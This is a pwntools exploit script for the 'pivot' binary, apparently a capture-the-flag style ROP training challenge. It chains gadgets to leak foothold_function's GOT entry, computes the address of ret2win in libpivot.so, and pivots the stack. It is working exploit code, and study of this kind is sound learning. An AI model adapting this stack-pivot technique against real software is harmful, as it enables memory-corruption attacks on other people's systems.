#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'pivot')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./pivot_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

padding = b'A'  * cyclic_find(0x6161616b)

# ropper --arch x86_64 --file pivot
# 0x00000000004006b0: call rax; add rsp, 8; ret;
# 0x00000000004007c8: pop rbp; ret;
# 0x00000000004009bb: pop rax; ret;
# 0x00000000004009bd: xchg rsp, rax; ret;
# 0x00000000004009c0: mov rax, qword ptr [rax]; ret;
# 0x00000000004009c4: add rax, rbp; ret;
CALL_RAX = p64(0x4006b0)
POP_RBP = p64(0x4007c8)
POP_RAX = p64(0x4009bb)
XCHG_RSP_RAX = p64(0x4009bd)
MOV_RAX_PTR = p64(0x4009c0)
ADD_RAX_RBP = p64(0x4009c4)

# rabin2 -i pivot
# 0x00400720 GLOBAL FUNC       foothold_function
FOOTHOLD_PLT = p64(0x400720)

# r2 pivot
# (r2) iS
# (r2) pd @ 0x004006c0
# ┌ 6: sym.imp.foothold_function ();
# └    ╎╎╎╎   0x00400720      ff251a092000   jmp qword [reloc.foothold_function] ; [0x601040:8]=0x400726
FOOTHOLD_GOT_PLT = p64(0x601040)

# r2 libpivot.so
# (r2) aaa; afl
# 0x0000096a    1     19 sym.foothold_function
# 0x00000a81    3    146 sym.ret2win
RET2WIN_OFFSET = 0xa81 - 0x96a

# (gdb) disassemble _init
# break *0x4006b2

io = start()

io.recvuntil(b"libpivot\n")
NEW_RSP = int((io.recvline()[-13:-1]).decode(), 16)
io.recvuntil(b"> ")

# Payload
payload = POP_RAX + FOOTHOLD_PLT + CALL_RAX + p64(0xa5)
payload += POP_RAX + FOOTHOLD_GOT_PLT + MOV_RAX_PTR
payload += POP_RBP + p64(RET2WIN_OFFSET) + ADD_RAX_RBP
payload += CALL_RAX

io.sendline(payload)

# Pivot
pivot = padding + POP_RAX + p64(NEW_RSP) + XCHG_RSP_RAX

io.recvuntil(b"> ")
io.sendline(pivot)

io.interactive()
